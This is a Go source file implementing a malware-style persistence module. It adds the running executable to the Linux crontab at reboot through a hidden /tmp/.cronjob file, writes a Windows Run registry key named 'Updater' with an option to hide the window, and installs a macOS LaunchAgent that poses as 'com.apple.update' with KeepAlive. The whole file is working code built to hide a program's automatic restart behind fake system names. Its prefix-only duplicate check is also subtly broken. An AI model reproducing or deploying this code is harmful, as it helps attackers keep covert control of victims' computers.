package persistence

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"text/template"
)

func AddToCron() error {
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %w", err)
	}

	cronTemplate := "@reboot {{.ExePath}}\n"
	tmpl, err := template.New("cron").Parse(cronTemplate)
	if err != nil {
		return fmt.Errorf("failed to parse cron template: %w", err)
	}

	var cronEntry bytes.Buffer
	err = tmpl.Execute(&cronEntry, map[string]string{"ExePath": exePath})
	if err != nil {
		return fmt.Errorf("failed to execute cron template: %w", err)
	}

	cmd := exec.Command("crontab", "-l")
	output, err := cmd.Output()
	if err != nil && err != exec.ErrNotFound { // Handle case where no crontab exists
		return fmt.Errorf("failed to list cron jobs: %w", err)
	}

	if contains(string(output), cronEntry.String()) {
		return nil
	}

	cronFile := "/tmp/.cronjob"
	file, err := os.Create(cronFile)
	if err != nil {
		return fmt.Errorf("failed to create cron file: %w", err)
	}
	defer file.Close()

	_, err = file.WriteString(string(output) + cronEntry.String())
	if err != nil {
		return fmt.Errorf("failed to write to cron file: %w", err)
	}

	err = exec.Command("crontab", cronFile).Run()
	if err != nil {
		return fmt.Errorf("failed to apply cron jobs: %w", err)
	}

	err = os.Remove(cronFile)
	if err != nil {
		return fmt.Errorf("failed to remove cron file: %w", err)
	}

	return nil
}

func AddToRegistry() error {
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %w", err)
	}

	regCmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", "Updater", "/t", "REG_SZ", "/d", exePath, "/f")

	// I recommend you follow a similar pattern here as I showed in the other spots
	if runtime.GOOS == "windows" {
		// Uncomment the following line when building for Windows
		// regCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	}

	err = regCmd.Run()
	if err != nil {
		return fmt.Errorf("failed to add to registry: %w", err)
	}

	return nil
}

func AddToLaunchAgent() error {
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %w", err)
	}

	plistPath := filepath.Join(os.Getenv("HOME"), "Library/LaunchAgents", "com.apple.update.plist")

	plistTemplate := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{{.ExePath}}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>`

	tmpl, err := template.New("plist").Parse(plistTemplate)
	if err != nil {
		return fmt.Errorf("failed to parse plist template: %w", err)
	}

	var plistContent bytes.Buffer
	err = tmpl.Execute(&plistContent, map[string]string{"ExePath": exePath})
	if err != nil {
		return fmt.Errorf("failed to execute plist template: %w", err)
	}

	err = os.WriteFile(plistPath, plistContent.Bytes(), 0644)
	if err != nil {
		return fmt.Errorf("failed to write LaunchAgent file: %w", err)
	}

	err = exec.Command("launchctl", "load", plistPath).Run()
	if err != nil {
		return fmt.Errorf("failed to load LaunchAgent: %w", err)
	}

	return nil
}

func contains(text, substring string) bool {
	return len(text) >= len(substring) && text[:len(substring)] == substring
}
